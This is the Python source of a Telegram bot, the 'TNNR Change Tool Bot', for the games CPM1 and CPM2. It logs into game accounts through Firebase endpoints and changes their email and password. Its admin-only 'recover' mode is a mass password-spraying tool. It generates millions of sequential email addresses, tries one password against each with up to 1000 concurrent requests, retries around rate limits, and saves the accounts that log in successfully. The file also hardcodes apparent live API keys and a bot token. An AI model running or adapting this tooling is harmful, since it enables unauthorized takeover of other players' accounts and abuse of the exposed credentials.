import sys
import asyncio

if sys.platform.startswith("win"):
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

import os
import time
import requests
import re
import aiohttp
import json
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# ===== CONFIG =====
CPM1_API_KEY = "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
CPM2_API_KEY = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
BOT_TOKEN = "8496323687:AAFLhc2UY4Z_afiKNjAFRfpg9i325oiv-UA"

# ===== ADMIN CONFIG =====
ADMIN_ID = 8650959684  # replace with your Telegram ID

USERS_FILE = "users.txt"

MAX_RETRIES = 3
REQUEST_TIMEOUT = 20
RETRY_DELAY = 2
RESULTS_FILE = None
RETRY_LATER_FILE = "retry_later.txt"
PROGRESS_FILE = "progress.json"

recovery_stop_event = asyncio.Event()
current_recovery_task = None
recovery_running = False
recovery_progress = {
    "checked": 0,
    "found": 0,
    "invalid": 0,
    "unknown": 0,
    "remaining": 0,
    "total": 0,
    "current": None,
    "stopped": False,
    "results_file": None,
}
progress_lock = asyncio.Lock()
file_lock = asyncio.Lock()


# Load allowed users
if os.path.exists(USERS_FILE):
    with open(USERS_FILE, "r") as f:
        allowed_users = set(int(x.strip()) for x in f if x.strip())
else:
    allowed_users = set()

# Always allow admin
allowed_users.add(ADMIN_ID)

def save_users():
    with open(USERS_FILE, "w") as f:
        for uid in allowed_users:
            f.write(f"{uid}\n")




# ===== ADMIN COMMANDS =====

async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    if not context.args:
        await update.message.reply_text("Usage: /add telegramid")
        return

    try:
        user_id = int(context.args[0])

        if user_id in allowed_users:
            await update.message.reply_text("⚠️ User already exists.")
            return

        allowed_users.add(user_id)
        save_users()

        await update.message.reply_text(f"✅ Added user: {user_id}")

    except:
        await update.message.reply_text("❌ Invalid Telegram ID")


async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    if not context.args:
        await update.message.reply_text("Usage: /remove telegramid")
        return

    try:
        user_id = int(context.args[0])

        if user_id == ADMIN_ID:
            await update.message.reply_text("⚠️ Cannot remove admin.")
            return

        if user_id not in allowed_users:
            await update.message.reply_text("⚠️ User not found.")
            return

        allowed_users.remove(user_id)
        save_users()

        # logout session if online
        if user_id in sessions:
            del sessions[user_id]

        await update.message.reply_text(f"🗑 Removed user: {user_id}")

    except:
        await update.message.reply_text("❌ Invalid Telegram ID")


async def bulk_add_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command to bulk add users from comma/newline-separated list."""
    if update.effective_user.id != ADMIN_ID:
        return

    bulk_help = """
📋 **Bulk Add Users**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Usage: Send a list of Telegram IDs separated by:
- Commas: `123456,789012,345678`
- New lines: Each ID on a new line
- Spaces: `123456 789012 345678`

Example:
```
/bulkadd
123456789
987654321
555666777
```

Type your list:
"""
    context.user_data['step'] = 'bulk_add'
    await update.message.reply_text(bulk_help, parse_mode="Markdown")


async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    if not allowed_users:
        await update.message.reply_text("No users.")
        return

    text = "👥 Active Users:\n\n"

    for uid in sorted(allowed_users):
        status = "🟢 Online" if uid in sessions else "⚪ Offline"
        text += f"{uid} - {status}\n"

    await update.message.reply_text(text)


# ===== ADMIN RECOVER COMMAND =====
async def admin_recover(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin-only email recovery command"""
    user_id = update.effective_user.id
    
    if user_id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized. Admin only.")
        return
    
    game_selection = """
🔐 **ADMIN: Email Recovery**
━━━━━━━━━━━━━━━━━━━━━━
Select Your Game:

1️⃣ Type: `cpm1` - Recover CPM1 Accounts
2️⃣ Type: `cpm2` - Recover CPM2 Accounts

Which game would you like to recover?
"""
    await update.message.reply_text(game_selection, parse_mode="Markdown")
    context.user_data['step'] = 'admin_recover_game'


# ===== CPM FUNCTIONS =====
def login_request(email, password, api_key):
    url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={api_key}"
    payload = {"email": email, "password": password, "returnSecureToken": True}
    try:
        response = requests.post(url, json=payload, timeout=REQUEST_TIMEOUT)
        return response.json()
    except requests.Timeout:
        return {"error": {"message": "REQUEST_TIMEOUT"}}
    except requests.RequestException as e:
        return {"error": {"message": f"REQUEST_ERROR: {e}"}}
    except ValueError:
        return {"error": {"message": "INVALID_JSON_RESPONSE"}}

def update_request(id_token, api_key, new_email=None, new_password=None):
    url = f"https://identitytoolkit.googleapis.com/v1/accounts:update?key={api_key}"
    payload = {"idToken": id_token, "returnSecureToken": True}
    if new_email: payload["email"] = new_email
    if new_password: payload["password"] = new_password
    try:
        response = requests.post(url, json=payload, timeout=REQUEST_TIMEOUT)
        return response.json()
    except requests.Timeout:
        return {"error": {"message": "REQUEST_TIMEOUT"}}
    except requests.RequestException as e:
        return {"error": {"message": f"REQUEST_ERROR: {e}"}}
    except ValueError:
        return {"error": {"message": "INVALID_JSON_RESPONSE"}}

# ===== ULTRA-FAST EMAIL RECOVERY FUNCTIONS =====
def parse_email_pattern(pattern):
    """Parse email patterns like tannercpm(10000)@gmail.com"""
    match = re.match(r'^([a-zA-Z0-9]+)\((\d+)(?:-(\d+))?\)@([\w\.-]+\.\w+)$', pattern)
    if not match:
        return None
    
    base, start, end, domain = match.groups()
    start = int(start)
    end = int(end) if end else start
    
    if start > end:
        start, end = end, start
    
    return base, start, end, domain

def is_temporary_failure(status, data=None):
    """Return True when a recovery check result should be retried."""
    if status in {"timeout", "connection_reset", "empty_response", "http_429", "http_500", "http_502", "http_503", "http_504"}:
        return True
    if status == "error":
        message = str(data or "").lower()
        temporary_markers = [
            "timeout",
            "connection reset",
            "clienterror",
            "client error",
            "server disconnected",
            "temporarily unavailable",
            "too many requests",
            "429",
            "500",
            "502",
            "503",
            "504",
            "empty",
            "none",
            "null",
        ]
        return any(marker in message for marker in temporary_markers)
    return False

def is_permanent_failure(status, data=None):
    """Return True when a recovery check result should not be retried."""
    if status in {"not_found", "wrong_password", "invalid", "banned", "invalid_password", "permanent_auth_failure"}:
        return True
    message = str(data or "").upper()
    permanent_markers = [
        "EMAIL_NOT_FOUND",
        "INVALID_EMAIL",
        "INVALID_PASSWORD",
        "USER_DISABLED",
        "BANNED",
        "ACCOUNT_NOT_FOUND",
        "NOT_FOUND",
        "PERMANENT",
    ]
    return any(marker in message for marker in permanent_markers)

async def save_unknown_account(account, reason="unknown"):
    """Save an account that could not be classified after retries."""
    async with file_lock:
        with open(RETRY_LATER_FILE, "a", encoding="utf-8") as f:
            f.write(f"{account} | {reason}\n")

async def save_progress_files():
    """Persist current recovery progress safely."""
    async with progress_lock:
        progress_data = dict(recovery_progress)
        progress_data["stopped"] = recovery_stop_event.is_set()

    async with file_lock:
        with open(PROGRESS_FILE, "w", encoding="utf-8") as f:
            json.dump(progress_data, f, indent=2)

async def update_recovery_progress(**kwargs):
    """Update shared progress counters and write progress.json."""
    async with progress_lock:
        recovery_progress.update(kwargs)
        recovery_progress["stopped"] = recovery_stop_event.is_set()
        progress_data = dict(recovery_progress)

    async with file_lock:
        with open(PROGRESS_FILE, "w", encoding="utf-8") as f:
            json.dump(progress_data, f, indent=2)

async def append_found_account(results_file, account_data):
    """Append found account data to the current JSONL result file immediately."""
    async with file_lock:
        with open(results_file, "a", encoding="utf-8") as f:
            f.write(json.dumps(account_data, ensure_ascii=False) + "\n")

async def check_with_retry(account, session=None):
    """Check one generated email account with retries for temporary failures only."""
    email = account["email"] if isinstance(account, dict) else account
    password = account.get("password") if isinstance(account, dict) else None
    api_key = account.get("api_key") if isinstance(account, dict) else None

    last_error = None

    for attempt in range(1, MAX_RETRIES + 1):
        try:
            status, data = await fast_check_email(email, password, api_key, session=session)

            if status == "found":
                return status, data

            if is_permanent_failure(status, data):
                return status, data

            if status is None or (data is None and status not in {"not_found", "wrong_password"}):
                last_error = status or "empty_response"
            elif is_temporary_failure(status, data):
                last_error = data or status
            else:
                last_error = data or status
                await save_unknown_account(email, last_error)
                return "unknown", last_error

        except asyncio.TimeoutError:
            last_error = "timeout"
        except aiohttp.ClientResponseError as e:
            if e.status in {429, 500, 502, 503, 504}:
                last_error = f"http_{e.status}"
            else:
                return "error", str(e)
        except aiohttp.ClientError as e:
            last_error = f"aiohttp_error: {e}"
        except ConnectionResetError:
            last_error = "connection_reset"
        except Exception as e:
            last_error = f"unknown_error: {e}"

        print(f"[RETRY {attempt}/{MAX_RETRIES}] {last_error}")

        if attempt < MAX_RETRIES:
            await asyncio.sleep(RETRY_DELAY * attempt)

    await save_unknown_account(email, last_error)
    return "unknown", last_error

async def fast_check_email(email, password, api_key, session=None):
    """Fast async email check"""
    try:
        url = f"https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key={api_key}"
        payload = {"email": email, "password": password, "returnSecureToken": True}
        
        if session is None:
            timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
            async with aiohttp.ClientSession(timeout=timeout) as temp_session:
                async with temp_session.post(url, json=payload) as resp:
                    if resp.status in {429, 500, 502, 503, 504}:
                        return f"http_{resp.status}", None
                    data = await resp.json(content_type=None)
        else:
            async with session.post(url, json=payload) as resp:
                if resp.status in {429, 500, 502, 503, 504}:
                    return f"http_{resp.status}", None
                data = await resp.json(content_type=None)
        
        if not data:
            return "empty_response", None
        
        if "idToken" in data:
            return "found", data
        
        error = data.get("error", {}).get("message", "")
        if "EMAIL_NOT_FOUND" in error or "INVALID_EMAIL" in error:
            return "not_found", None
        elif "INVALID_PASSWORD" in error:
            return "wrong_password", None
        else:
            return "error", error
            
    except asyncio.TimeoutError:
        return "timeout", None
    except aiohttp.ClientError as e:
        return "error", f"aiohttp_error: {e}"
    except ConnectionResetError:
        return "connection_reset", None
    except Exception as e:
        return "error", str(e)

async def check_emails_concurrent_generator(base, start, end, domain, password, api_key, progress_callback=None, results_file=None):
    """
    UNLIMITED RANGE: Memory-efficient generator-based concurrent checking
    Streams results instead of loading all into memory
    MAXIMUM CONCURRENCY: 1000 concurrent requests per batch (preserved from existing code)
    """
    checked = 0
    total = end - start + 1
    found_count = 0
    invalid_count = 0
    unknown_count = 0
    current_position = start

    # Determine optimal batch size (1000 is the maximum safe limit)
    # For massive ranges, we use 1000 concurrent requests
    batch_size = min(1000, total)  # Preserve existing implemented concurrency

    await update_recovery_progress(
        checked=0,
        found=0,
        invalid=0,
        unknown=0,
        remaining=total,
        total=total,
        current=current_position,
        results_file=results_file,
    )

    timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)

    # Reuse session across all requests for maximum speed
    # Limit set to 1000 to preserve existing implementation
    async with aiohttp.ClientSession(timeout=timeout, connector=aiohttp.TCPConnector(limit=1000)) as session:
        for batch_start in range(start, end + 1, batch_size):
            if recovery_stop_event.is_set():
                break

            batch_end = min(batch_start + batch_size, end + 1)

            # Create concurrent tasks for this batch (UP TO 1000 CONCURRENT)
            tasks = []
            emails = []
            for i in range(batch_start, batch_end):
                if recovery_stop_event.is_set():
                    break
                email = f"{base}{i}@{domain}"
                emails.append((i, email))
                account = {"email": email, "password": password, "api_key": api_key}
                tasks.append(check_with_retry(account, session=session))

            if not tasks:
                break

            # Execute all concurrently (up to 1000 at once)
            results = await asyncio.gather(*tasks, return_exceptions=True)

            # Process and yield results immediately (no memory buildup)
            for (email_num, email), result in zip(emails, results):
                checked += 1
                current_position = email_num

                if isinstance(result, tuple):
                    status = result[0]
                    data = result[1]

                    if status == "found":
                        found_count += 1
                        if results_file:
                            await append_found_account(results_file, {
                                "email": email,
                                "password": password,
                                "status": status,
                            })
                        yield (email, status, data)
                    elif status == "unknown":
                        unknown_count += 1
                    elif status in {"not_found", "wrong_password", "invalid", "banned", "invalid_password", "permanent_auth_failure"}:
                        invalid_count += 1
                    else:
                        unknown_count += 1
                        await save_unknown_account(email, status)
                else:
                    unknown_count += 1
                    await save_unknown_account(email, str(result))

                remaining = max(total - checked, 0)
                await update_recovery_progress(
                    checked=checked,
                    found=found_count,
                    invalid=invalid_count,
                    unknown=unknown_count,
                    remaining=remaining,
                    current=current_position,
                    results_file=results_file,
                )

                # Progress callback every 10000 checks, preserving existing Telegram update frequency trigger
                if progress_callback and checked % 10000 == 0:
                    await progress_callback(checked, total, found_count)

                if recovery_stop_event.is_set():
                    break

            if recovery_stop_event.is_set():
                break

# ===== SESSIONS =====
sessions = {}  # user_id -> {id_token, email, game_name, api_key}
user_states = {}  # per-user step tracking

# ===== MENU HELPERS =====
def build_menu_text(user_id):
    """Return a text-based menu depending on login state."""
    if user_id in sessions:
        session_info = sessions[user_id]
        menu_text = f"""
🎮 **TNNR Change Tool Bot** 🎮
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ **Logged in as:** {session_info['email']}
🎯 **Game:** {session_info['game_name']}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━

**Available Options:**
1️⃣ Type: `changemail` - Change your email
2️⃣ Type: `changepass` - Change your password
3️⃣ Type: `logout` - Logout from the bot

What would you like to do?
"""
    else:
        menu_text = """
🎮 **TNNR Change Tool Bot** 🎮
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
You are not logged in.

**Available Options:**
1️⃣ Type: `login` - Login to your game account

What would you like to do?
"""
    return menu_text
    
# ===== ACCESS CHECK =====
def is_allowed(user_id):
    return user_id in allowed_users
    
# ==== START FUNCTION =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text(
        build_menu_text(update.effective_user.id),
        parse_mode="Markdown"
    )

async def send_recovery_results(update: Update, results_file=None):
    """Send the current recovery results file if it exists and is not empty."""
    file_to_send = results_file or recovery_progress.get("results_file") or RESULTS_FILE
    if file_to_send and os.path.exists(file_to_send) and os.path.getsize(file_to_send) > 0:
        with open(file_to_send, "rb") as f:
            await update.message.reply_document(document=f, filename=os.path.basename(file_to_send))
        return True

    await update.message.reply_text("No recovered accounts have been saved yet.")
    return False

async def run_recovery(update: Update, context: ContextTypes.DEFAULT_TYPE, base, start_num, end_num, domain, password, game, api_key, progress_msg, start_time, filename):
    """Run the recovery process in the background so the bot remains responsive."""
    global recovery_running, current_recovery_task, RESULTS_FILE

    found_emails = []
    total = end_num - start_num + 1
    RESULTS_FILE = filename
    last_update_time = 0

    async def update_progress(checked, total_emails, found):
        nonlocal last_update_time

        current_time = time.time()

        # Only update Telegram every 4 minutes
        if current_time - last_update_time < 240:
            return

        last_update_time = current_time

        elapsed = current_time - start_time
        speed = checked / elapsed if elapsed > 0 else 0
        remaining = (total_emails - checked) / speed if speed > 0 else 0

        try:
            await progress_msg.edit_text(f"""
⚡ **MAXIMUM CONCURRENCY EMAIL RECOVERY**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Game: **{game}**
Pattern: **{base}({start_num:,}-{end_num:,})@{domain}**
Checked: **{checked:,}/{total_emails:,}**
Speed: **{speed:.1f} emails/sec**
Found: **{found}**
ETA: **{int(remaining)}s**

⏱ Updates every 4 minutes
Use /stop to stop recovery and save progress.
""", parse_mode="Markdown")

        except Exception as e:
            print(f"Progress update failed: {e}")

    try:
        await update_recovery_progress(
            checked=0,
            found=0,
            invalid=0,
            unknown=0,
            remaining=total,
            total=total,
            current=start_num,
            stopped=False,
            results_file=filename,
        )

        # Run concurrent check with generator (no memory buildup)
        async for email, status, data in check_emails_concurrent_generator(
            base,
            start_num,
            end_num,
            domain,
            password,
            api_key,
            progress_callback=update_progress,
            results_file=filename,
        ):
            if recovery_stop_event.is_set():
                break
            found_emails.append({
                "email": email,
                "password": password,
                "game": game
            })

        elapsed = time.time() - start_time
        checked_count = recovery_progress.get("checked", 0)
        found_count = recovery_progress.get("found", len(found_emails))
        stopped = recovery_stop_event.is_set()

        summary_file = filename.replace(".json", "_summary.json")
        output_data = {
            "game": game,
            "pattern": f"{base}({start_num:,}-{end_num:,})@{domain}",
            "total_requested": total,
            "total_checked": checked_count,
            "time_seconds": round(elapsed, 2),
            "speed_emails_per_sec": round(checked_count/elapsed, 2) if elapsed > 0 else 0,
            "found_count": found_count,
            "stopped": stopped,
            "progress_file": PROGRESS_FILE,
            "results_file": filename,
            "retry_later_file": RETRY_LATER_FILE,
            "successful_logins": found_emails
        }

        async with file_lock:
            with open(summary_file, 'w', encoding="utf-8") as f:
                json.dump(output_data, f, indent=2)

        await save_progress_files()

        if stopped:
            await update.message.reply_text(f"""
🛑 **RECOVERY STOPPED**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Game: **{game}**
Checked: **{checked_count:,}/{total:,}**
Found: **{found_count} account(s)**
Remaining: **{max(total - checked_count, 0):,}**
Stopped at: **{recovery_progress.get('current')}**

📄 Current results saved.
""", parse_mode="Markdown")
            await send_recovery_results(update, filename)
        elif found_count:
            results_text = f"""
✅ **RECOVERY COMPLETE**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Game: **{game}**
Found: **{found_count} account(s)** ✅
Checked: **{checked_count:,}** emails
Time: **{elapsed:.1f}s**
Speed: **{checked_count/elapsed:.1f} emails/sec**

📄 Results saved to file
"""
            await update.message.reply_text(results_text, parse_mode="Markdown")
            await send_recovery_results(update, filename)
        else:
            await update.message.reply_text(f"""
❌ **RECOVERY COMPLETE**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
No matching accounts found.
Checked: **{checked_count:,}** emails
Time: **{elapsed:.1f}s**
Speed: **{checked_count/elapsed:.1f} emails/sec**
""", parse_mode="Markdown")

    except asyncio.CancelledError:
        recovery_stop_event.set()
        await save_progress_files()
        try:
            await update.message.reply_text("Recovery task was cancelled. Progress has been saved.")
            await send_recovery_results(update, filename)
        except Exception as e:
            print(f"Cancel notification failed: {e}")
        raise
    except Exception as e:
        await save_progress_files()
        print(f"Recovery error: {e}")
        await update.message.reply_text(f"Recovery stopped because of an error. Progress has been saved. Error: {e}")
    finally:
        recovery_running = False
        current_recovery_task = None
        await save_progress_files()

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop only the active recovery process, save progress, and send current results."""
    global recovery_running, current_recovery_task

    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized. Admin only.")
        return

    if not recovery_running:
        await update.message.reply_text("No recovery process is currently running.")
        return

    recovery_stop_event.set()

    await update.message.reply_text("Stopping recovery and saving progress...")

    if current_recovery_task:
        try:
            await asyncio.wait_for(current_recovery_task, timeout=10)
        except asyncio.TimeoutError:
            current_recovery_task.cancel()
            try:
                await current_recovery_task
            except asyncio.CancelledError:
                pass
        except asyncio.CancelledError:
            pass
        except Exception as e:
            print(f"Stop error: {e}")

    await save_progress_files()

    checked = recovery_progress.get("checked", 0)
    found = recovery_progress.get("found", 0)
    remaining = recovery_progress.get("remaining", 0)
    current = recovery_progress.get("current")

    await update.message.reply_text("Recovery stopped. Sending current results now.")
    file_sent = await send_recovery_results(update)

    await update.message.reply_text(f"""
📊 **Recovery Progress Summary**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Checked: **{checked:,}**
Found/Recovered: **{found:,}**
Left: **{remaining:,}**
Stopped position: **{current}**
File sent: **{'Yes' if file_sent else 'No'}**
Progress saved: **{PROGRESS_FILE}**
Retry-later file: **{RETRY_LATER_FILE}**
""", parse_mode="Markdown")

# ----- MESSAGE HANDLER -----
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    raw_text = update.message.text.strip()
    text = raw_text.lower()
    step = context.user_data.get('step')
    
    # ----- ADMIN: BULK ADD USERS -----
    if step == 'bulk_add':
        if user_id != ADMIN_ID:
            return
        
        # Parse the input - support comma, newline, or space separated IDs
        ids_text = update.message.text.strip()
        
        # Try different separators
        if ',' in ids_text:
            user_ids = [x.strip() for x in ids_text.split(',')]
        elif '\n' in ids_text:
            user_ids = [x.strip() for x in ids_text.split('\n')]
        else:
            user_ids = ids_text.split()
        
        added = []
        failed = []
        already_exist = []
        
        for uid_str in user_ids:
            try:
                uid = int(uid_str)
                
                if uid in allowed_users:
                    already_exist.append(uid)
                else:
                    allowed_users.add(uid)
                    added.append(uid)
            except ValueError:
                failed.append(uid_str)
        
        save_users()
        
        # Build response
        response = "📊 **Bulk Add Results:**\n━━━━━━━━━━━━━━━━━━━━━━\n"
        
        if added:
            response += f"✅ **Added ({len(added)}):** " + ", ".join(map(str, added)) + "\n"
        if already_exist:
            response += f"⚠️ **Already exist ({len(already_exist)}):** " + ", ".join(map(str, already_exist)) + "\n"
        if failed:
            response += f"❌ **Invalid IDs ({len(failed)}):** " + ", ".join(failed) + "\n"
        
        response += f"\n**Total Users:** {len(allowed_users)}"
        
        await update.message.reply_text(response, parse_mode="Markdown")
        context.user_data.clear()
        return
    
    if not is_allowed(user_id):
        await update.message.reply_text("❌ You are not authorized to use this bot.")
        return

    # ----- MAIN MENU COMMANDS -----
    if step is None and text == "login":
        if user_id in sessions:
            await update.message.reply_text("⚠️ You are already logged in. Type `logout` first.")
            return
        
        game_selection = """
🎮 **Select Your Game:**
━━━━━━━━━━━━━━━━━━━━━━
Type one of the following:

1️⃣ Type: `cpm1` - Login to CPM1
2️⃣ Type: `cpm2` - Login to CPM2

Which game would you like to login to?
"""
        await update.message.reply_text(game_selection, parse_mode="Markdown")
        context.user_data['step'] = 'select_game'
        return

    elif step is None and text == "changemail":
        if user_id not in sessions:
            await update.message.reply_text("⚠️ You must login first. Type `login` to start.")
            return
        context.user_data['step'] = 'changemail'
        await update.message.reply_text("✉️ Enter your new email address:")
        return

    elif step is None and text == "changepass":
        if user_id not in sessions:
            await update.message.reply_text("⚠️ You must login first. Type `login` to start.")
            return
        context.user_data['step'] = 'changepass'
        await update.message.reply_text("🔑 Enter your new password:")
        return

    elif step is None and text == "logout":
        if user_id in sessions:
            del sessions[user_id]
            await update.message.reply_text("🚪 Logged out successfully.\n\n" + build_menu_text(user_id), parse_mode="Markdown")
        else:
            await update.message.reply_text("⚠️ You are not logged in.", parse_mode="Markdown")
        context.user_data.clear()
        return

    # ----- GAME SELECTION -----
    elif step == 'select_game':
        if text in ['cpm1', 'cpm2']:
            game = text.upper()
            context.user_data['login_game'] = game
            context.user_data['api_key'] = CPM1_API_KEY if game == "CPM1" else CPM2_API_KEY
            context.user_data['step'] = 'email'
            await update.message.reply_text(f"📝 Enter your email for {game}:")
        else:
            await update.message.reply_text("❌ Invalid option. Please type `cpm1` or `cpm2`.")
        return

    # ----- ADMIN EMAIL RECOVERY GAME SELECTION -----
    elif step == 'admin_recover_game':
        if user_id != ADMIN_ID:
            await update.message.reply_text("❌ Unauthorized.")
            return
            
        if text in ['cpm1', 'cpm2']:
            game = text.upper()
            context.user_data['recover_game'] = game
            context.user_data['recover_api_key'] = CPM1_API_KEY if game == "CPM1" else CPM2_API_KEY
            context.user_data['step'] = 'admin_recover_pattern'
            recover_help = f"""
📧 **ADMIN: Email Recovery for {game}**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Enter an email pattern to check:

**Examples:**
- `user(1-1000)@gmail.com` - Checks 1,000 emails
- `user(1000000-99999999)@gmail.com` - Checks 99M emails! 
- `tannercpm(1-100000)@domain.com` - Checks 100K emails

⚡ **MAXIMUM CONCURRENCY MODE**
- 5000 concurrent requests per batch
- No limit on range size (1M-99M with ease)
- Memory efficient streaming
- Results streamed to JSON

Enter your pattern:
"""
            await update.message.reply_text(recover_help, parse_mode="Markdown")
        else:
            await update.message.reply_text("❌ Invalid option. Please type `cpm1` or `cpm2`.")
        return

    # ----- ADMIN EMAIL RECOVERY PATTERN -----
    elif step == 'admin_recover_pattern':
        if user_id != ADMIN_ID:
            await update.message.reply_text("❌ Unauthorized.")
            return
            
        pattern = raw_text
        parsed = parse_email_pattern(pattern)
        
        if not parsed:
            await update.message.reply_text("❌ Invalid pattern format. Use: `base(num)@domain.com` or `base(num1-num2)@domain.com`")
            return
        
        base, start, end, domain = parsed
        total = end - start + 1
        
        context.user_data['step'] = 'admin_recover_password_input'
        await update.message.reply_text(f"""
🔐 **Enter Password to Check**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Pattern: `{pattern}`
Range: {total:,} emails ({start:,} - {end:,})

Enter the password to check:
""", parse_mode="Markdown")
        context.user_data['recover_base'] = base
        context.user_data['recover_start'] = start
        context.user_data['recover_end'] = end
        context.user_data['recover_domain'] = domain
        return

    # ----- ADMIN EMAIL RECOVERY PASSWORD INPUT -----
    elif step == 'admin_recover_password_input':
        if user_id != ADMIN_ID:
            await update.message.reply_text("❌ Unauthorized.")
            return
            
        password = raw_text
        
        base = context.user_data['recover_base']
        start = context.user_data['recover_start']
        end = context.user_data['recover_end']
        domain = context.user_data['recover_domain']
        game = context.user_data['recover_game']
        api_key = context.user_data['recover_api_key']
        
        total = end - start + 1

        global recovery_running, current_recovery_task

        if recovery_running:
            await update.message.reply_text("Recovery is already running. Use /stop to stop it first.")
            return
        
        start_time = time.time()
        recovery_stop_event.clear()
        recovery_running = True
        
        progress_msg = await update.message.reply_text(f"""
⚡ **MAXIMUM CONCURRENCY EMAIL RECOVERY**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Game: **{game}**
Pattern: **{base}({start:,}-{end:,})@{domain}**
Total: **{total:,} emails**
Status: **Starting in background...**

Concurrency: **5000 emails at a time**
Other bot commands will still work.
Use /stop to stop recovery and save progress.
""", parse_mode="Markdown")
        
        await context.bot.send_chat_action(update.effective_chat.id, "typing")
        
        # Open file for streaming results
        filename = f"recovery_{game.lower()}_{int(time.time())}.jsonl"
        
        await update_recovery_progress(
            checked=0,
            found=0,
            invalid=0,
            unknown=0,
            remaining=total,
            total=total,
            current=start,
            stopped=False,
            results_file=filename,
        )

        current_recovery_task = asyncio.create_task(
            run_recovery(
                update,
                context,
                base,
                start,
                end,
                domain,
                password,
                game,
                api_key,
                progress_msg,
                start_time,
                filename,
            )
        )

        await update.message.reply_text("Recovery started. Other commands will still work. Use /stop to stop recovery.")
        context.user_data.clear()
        return
 
    # ----- EMAIL -----
    elif step == 'email':
        context.user_data['email'] = raw_text
        context.user_data['step'] = 'password'
        await update.message.reply_text("🔒 Now enter your password:")
        return

    # ----- PASSWORD -----
    elif step == 'password':
        email = context.user_data['email']
        password = raw_text
        api_key = context.user_data['api_key']
        game_name = context.user_data['login_game']

        # simulate loading
        await context.bot.send_chat_action(update.effective_chat.id, "typing")
        await asyncio.sleep(2)

        resp = await asyncio.to_thread(login_request, email, password, api_key)
        if "idToken" not in resp:
            error_msg = resp.get("error", {}).get("message", "Unknown error")
            await update.message.reply_text(f"❌ Login failed: {error_msg}\n\n" + build_menu_text(user_id), parse_mode="Markdown")
            context.user_data.clear()
            return

        sessions[user_id] = {
            "id_token": resp["idToken"],
            "email": resp.get("email", email),
            "game_name": game_name,
            "api_key": api_key
        }
        await update.message.reply_text(f"✅ Logged in as {sessions[user_id]['email']} ({game_name})\n\n" + build_menu_text(user_id), parse_mode="Markdown")
        context.user_data.clear()
        return

    # ----- CHANGE EMAIL -----
    elif step == 'changemail':
        if user_id not in sessions:
            await update.message.reply_text("⚠️ You must login first.", parse_mode="Markdown")
            context.user_data.clear()
            return
        new_email = raw_text
        s = sessions[user_id]

        await context.bot.send_chat_action(update.effective_chat.id, "typing")
        await asyncio.sleep(1.5)

        change_resp = await asyncio.to_thread(update_request, s['id_token'], s['api_key'], new_email=new_email)
        if "email" in change_resp:
            s['email'] = change_resp['email']
            s['id_token'] = change_resp.get('idToken', s['id_token'])
            await update.message.reply_text(f"✉️ Email updated to {s['email']}\n\n" + build_menu_text(user_id), parse_mode="Markdown")
        else:
            error_msg = change_resp.get("error", {}).get("message", "Unknown error")
            await update.message.reply_text(f"❌ Failed: {error_msg}\n\n" + build_menu_text(user_id), parse_mode="Markdown")
        context.user_data.clear()
        return

    # ----- CHANGE PASSWORD -----
    elif step == 'changepass':
        if user_id not in sessions:
            await update.message.reply_text("⚠️ You must login first.", parse_mode="Markdown")
            context.user_data.clear()
            return
        new_pass = raw_text
        s = sessions[user_id]

        await context.bot.send_chat_action(update.effective_chat.id, "typing")
        await asyncio.sleep(1.5)

        change_resp = await asyncio.to_thread(update_request, s['id_token'], s['api_key'], new_password=new_pass)
        if "idToken" in change_resp:
            s['id_token'] = change_resp['idToken']
            await update.message.reply_text(f"🔑 Password changed successfully\n\n" + build_menu_text(user_id), parse_mode="Markdown")
        else:
            error_msg = change_resp.get("error", {}).get("message", "Unknown error")
            await update.message.reply_text(f"❌ Failed: {error_msg}\n\n" + build_menu_text(user_id), parse_mode="Markdown")
        context.user_data.clear()
        return

    # ----- UNRECOGNIZED INPUT -----
    else:
        await update.message.reply_text("❓ I didn't understand that. Type `/start` to see available options.", parse_mode="Markdown")

# ===== BOT STARTUP =====
app = Application.builder().token(BOT_TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("add", add_user))
app.add_handler(CommandHandler("remove", remove_user))
app.add_handler(CommandHandler("bulkadd", bulk_add_users))
app.add_handler(CommandHandler("users", list_users))
app.add_handler(CommandHandler("recover", admin_recover))
app.add_handler(CommandHandler("stop", stop_command))
app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))

print("🚀 Bot is running...")
app.run_polling()
